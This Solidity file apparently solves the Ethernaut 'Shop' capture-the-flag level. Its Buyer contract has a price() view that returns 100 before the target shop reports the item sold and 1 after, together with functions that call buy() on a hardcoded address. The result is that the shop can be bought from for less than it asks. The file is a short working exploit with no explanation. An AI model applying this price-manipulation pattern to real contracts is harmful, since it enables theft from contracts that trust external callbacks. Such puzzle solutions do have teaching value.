// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
  function buy() external;
  function isSold() external view returns (bool);


}

contract Buyer {

address public shoppy = 0x808E30F5A641E756Ae0a46917493b2Dc3637f808;
bool public toggle = true;


    function price() public view returns (uint) {
       Shop shop = Shop(shoppy);

        if (!shop.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }

    function callShop(address _addr) public {
        Shop shop = Shop(_addr);
        shop.buy();
    }

    function callShopTwo() public {
        Shop shop = Shop(shoppy);
        shop.buy();
    }

    function returnIsSold() public view returns (bool) {
        Shop shop = Shop(shoppy);
        return shop.isSold();
    }


// EXTRA


}

